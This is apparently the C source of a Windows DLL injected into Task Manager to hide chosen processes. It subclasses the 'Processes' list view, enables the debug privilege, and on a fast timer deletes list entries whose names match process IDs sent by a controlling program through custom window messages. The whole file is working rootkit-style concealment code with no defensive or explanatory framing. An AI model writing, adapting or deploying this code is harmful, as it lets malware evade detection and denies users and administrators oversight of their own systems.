#include <windows.h>
#include <stdio.h>
#include <commctrl.h>
#include <psapi.h>
#include "resource.h"

WNDPROC wndProcOriginal = NULL;
HWND	g_hWnd = NULL;
HWND    g_Processes;
HWND    g_Status = NULL;

#pragma data_seg (".shared")
#pragma data_seg ()

#pragma comment(linker,"/SECTION:.shared,RWS") 

#ifdef WANT_DEBUGGER
#include <time.h>

HANDLE hFileDebugLog = INVALID_HANDLE_VALUE;

VOID DebugLog(const char *format, ...)
{
	va_list args;
	time_t ct = time(0);
	char *time_s = asctime(localtime(&ct));
	char szTemp[5000];
	char szTemp2[5000];
	SYSTEMTIME st;
	DWORD dwNumBytes;

	if (format == NULL)
		format = "SYSERR: DebugLog() received a NULL format.";

	time_s[strlen(time_s) - 1] = '\0';
	sprintf(szTemp, "%-15.15s :: ", time_s + 4);

	va_start(args, format);
	vsprintf(szTemp2, format, args);
	strcat(szTemp, szTemp2);
	va_end(args);

	if (hFileDebugLog == INVALID_HANDLE_VALUE)
	{
		GetLocalTime(&st);
		sprintf(szTemp2, "C:\\Debug Log, %04d-%02d-%02d.LOG", st.wYear, st.wMonth, st.wDay);
		hFileDebugLog = CreateFile(szTemp2, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
		SetFilePointer(hFileDebugLog, 0, NULL, FILE_END);
	}

	WriteFile(hFileDebugLog, szTemp, sizeof(CHAR) * strlen(szTemp), &dwNumBytes, NULL);
	WriteFile(hFileDebugLog, "\r\n", sizeof(CHAR) * 2, &dwNumBytes, NULL);
	return;
}
#endif

#ifdef WANT_DEBUGGER
BOOL FilterMessage(UINT uMsg)
{
	if (uMsg == 0x00000002)								// WM_DESTROY
		return TRUE;
	if (uMsg == 0x00000006)								// WM_ACTIVATE
		return TRUE;
	if (uMsg == 0x00000014)								// WM_ERASEBKGND
		return TRUE;
	if (uMsg == 0x0000001C)								// WM_ACTIVATEAPP
		return TRUE;
	if (uMsg == 0x00000020)								// WM_SETCURSOR
		return TRUE;
	if (uMsg == 0x00000021)								// WM_MOUSEACTIVATE
		return TRUE;
	if (uMsg == 0x00000046)								// WM_WINDOWPOSCHANGING
		return TRUE;
	if (uMsg == 0x00000047)								// WM_WINDOWPOSCHANGED
		return TRUE;
	if (uMsg == 0x00000082)								// WM_NCDESTROY ?
		return TRUE;
	if (uMsg == 0x00000084)								// WM_NCHITTEST ?
		return TRUE;
	if (uMsg == 0x00000086)								// WM_NCACTIVATE
		return TRUE;
	if (uMsg == 0x000000A0)								// WM_NCMOUSEMOVE
		return TRUE;
	if (uMsg == 0x00000111)								// WM_COMMAND
		return TRUE;
	if (uMsg == 0x00000113)								// WM_TIMER
		return TRUE;
	if ((uMsg >= 0x00000132) && (uMsg <= 0x00000138))	// WM_CTLCOLORxxx
		return TRUE;
	if (uMsg == 0x00000200)								// WM_MOUSEFIRST
		return TRUE;
	if (uMsg == 0x00000210)								// WM_PARENTNOTIFY ?
		return TRUE;
	if (uMsg == 0x000002A2)								// WM_NCMOUSELEAVE
		return TRUE;
	if (uMsg == 0x00000318)								// WM_PRINTCLIENT ?
		return TRUE;


	if (uMsg == 0x0000100E)
		return TRUE;
	if (uMsg == 0x0000102C)
		return TRUE;
	if (uMsg == 0x0000102D)
		return TRUE;


	if (uMsg == 0x1004)
		return TRUE;
	if (uMsg == 0x1015)
		return TRUE;
	if (uMsg == 0x104B)
		return TRUE;
	if (uMsg == 0x104C)
		return TRUE;
	if (uMsg == 0x100C)
		return TRUE;
	if (uMsg == 0x1032)
		return TRUE;

	// 0x400 = ?

	return FALSE;
}
#endif

struct process_list_tag
{
	DWORD dwProcess;
	struct process_list_tag *next;
} *list_of_processes = NULL;

VOID RemoveThisProcessFromList(DWORD dwProcess)
{
	struct process_list_tag *temp, *temp2, *prev;

	if (!list_of_processes)
		return;

	if (list_of_processes->dwProcess == dwProcess)
	{
		temp = list_of_processes->next;
		free(list_of_processes);
		list_of_processes = temp;
		return;
	}

	for (temp = list_of_processes; temp; temp = temp->next)
	{
		if (temp->dwProcess == dwProcess)
		{
			temp2 = temp->next;
			free(temp);
			prev->next = temp2;
			return;
		}

		prev = temp;
	}

	return;
}

VOID RemoveAllProcessesFromList(VOID)
{
	struct process_list_tag *temp;

here:
	if (list_of_processes)
	{
		temp = list_of_processes->next;
		free(list_of_processes);
		list_of_processes = temp;
		goto here;
	}

	return;
}

VOID AddThisProcessToList(DWORD dwProcess)
{
	struct process_list_tag *temp;

	RemoveThisProcessFromList(dwProcess);

	if (list_of_processes)
	{
		temp = (struct process_list_tag *)malloc(sizeof(struct process_list_tag));
		temp->next = list_of_processes;
		temp->dwProcess = dwProcess;
		list_of_processes = temp;
	}
	else
	{
		list_of_processes = (struct process_list_tag *)malloc(sizeof(struct process_list_tag));
		list_of_processes->next = NULL;
		list_of_processes->dwProcess = dwProcess;
	}

	return;
}

/*
BOOL CALLBACK FindProcessesStatusWindowEnum(HWND hWnd, LPARAM lParam)
{
	char name[256]; 
	GetWindowText(hWnd,name,256);

	char ClassName[256];
	GetClassName(hWnd,ClassName,256);

	if((strcmp(ClassName,"msctls_statusbar32")==0)&&(strstr(name,"Processes: ")==name))
		g_Status = hWnd;

	if (name == NULL)
		return FALSE;
	return TRUE;
}

VOID FindProcessesStatusWindow(HWND hWndStart)
{
	g_Processes = NULL;
	EnumChildWindows(hWndStart, FindProcessesStatusWindowEnum, NULL);
}
*/

BOOL CALLBACK FindProcessesWindowEnum(HWND hWnd, LPARAM lParam)
{
	char name[256]; 
	GetWindowText(hWnd,name,256);

	char ClassName[256];
	GetClassName(hWnd,ClassName,256);

	if((strcmp(ClassName,"SysListView32")==0)&&(strcmp(name,"Processes")==0))
		g_Processes = hWnd;

	if (name == NULL)
		return FALSE;
	return TRUE;
}

VOID FindProcessesWindow(HWND hWndStart)
{
	g_Processes = NULL;
	EnumChildWindows(hWndStart, FindProcessesWindowEnum, NULL);
}

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM p)
{
	DWORD pid;
	GetWindowThreadProcessId(hWnd, &pid);

	if (p == pid)
	{
		g_hWnd = hWnd;
		return FALSE;
	}

	return TRUE;
}

CHAR _extracted_szFileName[400];
LPTSTR ExtractFileNameFromPath(LPTSTR szFileName)
{
	CHAR *szT, *szT2;

	memset(_extracted_szFileName, 0, sizeof(CHAR) * 400);

	if (szFileName)
	{
		szT2 = szT = strchr(szFileName, '\\');
		while (szT2)
		{
			szT2 = strchr(szT + sizeof(CHAR), '\\');
			if (szT2)
				szT = szT2;
		}
		if (szT)
			strcpy(_extracted_szFileName, szT + sizeof(CHAR));
		else
			strcpy(_extracted_szFileName, szFileName);
	}

	return (_extracted_szFileName);
}

VOID GetFileNameFromProcess(CHAR *szInput, DWORD dwProcess)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcess);
	GetProcessImageFileName(hProcess, szInput, MAX_PATH);
	CloseHandle(hProcess);
	return;
}

VOID FindOurApps(HWND hWnd)
{
	WPARAM x, i, k;
	char szListText[260];
	struct process_list_tag *temp;
	char szProcessFileName[MAX_PATH], *szProcessShortName;

start_over:
	x = ListView_GetItemCount(hWnd);

	// for each hidden process
	for (temp = list_of_processes; temp; temp = temp->next)
	{
		GetFileNameFromProcess(szProcessFileName, temp->dwProcess);
		szProcessShortName = ExtractFileNameFromPath(szProcessFileName);

		// and for each column in the Process list
		for (k = 0; k < 10; k++)
		{
			// and for each item in the Process list
			for (i = 0; i < x; i++)
			{
				memset((char *)szListText, (char)0, sizeof(char) * 260);
				ListView_GetItemText(hWnd, i, (INT)k, szListText, 260);

				// find and remove our hidden processes
				if (!strcmp(szListText, szProcessShortName))
				{
#ifdef WANT_DEBUGGER
					DebugLog("Found hidden process %ld in list, removed it", temp->dwProcess);
#endif
					ListView_DeleteItem(hWnd, i);
					goto start_over;
				}
			}
		}
	}

	/*
	if (g_Status == NULL)
		FindProcessesStatusWindow(g_hWnd);

	if ((x > 0) && (g_Status != NULL))
	{
//		LockWindowUpdate(NULL);
		sprintf(szListText, "Processes: %ld", x);
		SendMessage(g_Status, WM_SETTEXT, (WPARAM)0, (LPARAM)szListText);
//		RedrawWindow(g_Status, NULL, NULL, RDW_UPDATENOW);
//		UpdateWindow(g_Status);
//		LockWindowUpdate(g_Status);
	}
	*/
	return;
}

HWND hWndMaster = NULL;

LRESULT APIENTRY FilterProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
{
	NMHDR      *upd_header;
	NMLISTVIEW *list_view;

#ifdef WANT_DEBUGGER
	if (FilterMessage(uMsg) == FALSE)
		DebugLog("recv msg 0x%04X from window %08XH with data %08XH / %08XH", uMsg, hWnd, wParam, lParam);
#endif

	/*
	RECT r;

	if (g_Status != NULL)
	{
		GetWindowRect(g_Status, &r);
		ValidateRect(g_Status, &r);
	}
	*/

	switch (uMsg)
	{
		case WM_NOTIFY:
			list_view  = (NMLISTVIEW *)lParam;
			upd_header = (NMHDR *)     &(list_view->hdr);

#ifdef WANT_DEBUGGER
			DebugLog("WM_NOTIFY from window %08X (%08X %08X %08X)", upd_header->hwndFrom, g_Processes, hWnd, g_hWnd);
			DebugLog("          %08X %08X %08X %08X", GetParent(upd_header->hwndFrom), GetParent(g_Processes), GetParent(hWnd), GetParent(g_hWnd));
			DebugLog("          %08X %08X %08X %08X", GetParent(GetParent(upd_header->hwndFrom)), GetParent(GetParent(g_Processes)), GetParent(GetParent(hWnd)), GetParent(GetParent(g_hWnd)));
			DebugLog("          %08X %08X %08X %08X", GetParent(GetParent(GetParent(upd_header->hwndFrom))), GetParent(GetParent(GetParent(g_Processes))), GetParent(GetParent(GetParent(hWnd))), GetParent(GetParent(GetParent(g_hWnd))));
			DebugLog(" ..data..             %08X", upd_header->code);
			DebugLog("                  vs: %08X  %08X  %08X  %08X", LVN_ITEMCHANGING, LVN_ITEMCHANGED, LVN_INSERTITEM, LVN_DELETEITEM);
			DebugLog("                  vs: %08X  %08X  %08X  %08X", LVN_DELETEALLITEMS, LVN_BEGINLABELEDITA, LVN_BEGINLABELEDITW, LVN_ENDLABELEDITA);
#endif

			// Notification of an update to this control
			if (upd_header->code == 0xFFFFFFF4)
			{
				FindOurApps(g_Processes);
			}
			break;

		case WM_TIMER:
			FindOurApps(g_Processes);
			break;

		case 0x1004: // delete entries
		case 0x1015:
		case 0x104B:
		case 0x104C:
		case 0x100C: // sorts entries
		case 0x1008:
			break;

		case 0x104D:  // finalizes new entry addition
			FindOurApps(g_Processes);
			break;

		case 0x7050:
#ifdef WANT_DEBUGGER
			DebugLog("Received notification to add process %ld to hidden list", lParam);
#endif
			AddThisProcessToList((DWORD)lParam);
			FindOurApps(g_Processes);
			return TRUE;

		case 0x7051:
#ifdef WANT_DEBUGGER
			DebugLog("Received notification to remove process %ld from hidden list", lParam);
#endif
			RemoveThisProcessFromList((DWORD)lParam);
			FindOurApps(g_Processes);
			return TRUE;

		case 0x7052:
#ifdef WANT_DEBUGGER
			DebugLog("Received notification to remove all processes from hidden list");
#endif
			RemoveAllProcessesFromList( );
			return TRUE;

		case 0x7054:
			hWndMaster = (HWND)lParam;
			SendMessage(hWndMaster, 0x7055, (WPARAM)0, (LPARAM)1);
			return TRUE;
	}

	return CallWindowProc(wndProcOriginal, hWnd, uMsg, wParam, lParam);
}

void GetDebugPrivs()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tp;

	if (::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if ( !::LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &sedebugnameValue ) )
		{
			::CloseHandle( hToken );
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = sedebugnameValue;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if ( !::AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(tp), NULL, NULL ) )
		{
			::CloseHandle( hToken );
		}

		::CloseHandle( hToken );
	}
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{	
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) 
	{
#ifdef WANT_DEBUGGER
		DebugLog("--- DLL injection ---");
#endif
		EnumWindows(EnumProc, GetCurrentProcessId());

		if (g_hWnd)
		{
//			FindProcessesStatusWindow(g_hWnd);
			FindProcessesWindow(g_hWnd);

			if (g_Processes)
			{
				//Subclass the window with our own window procedure.
				wndProcOriginal = (WNDPROC)SetWindowLong(g_Processes, GWL_WNDPROC, (LONG)(WNDPROC)FilterProc);
				SetTimer(g_Processes, 54535, 75, NULL);
				GetDebugPrivs();
			}
		}
	}

	if (ul_reason_for_call == DLL_THREAD_DETACH)
	{
		SendMessage(hWndMaster, 0x7055, (WPARAM)0, (LPARAM)0);
	}

    return TRUE;
}

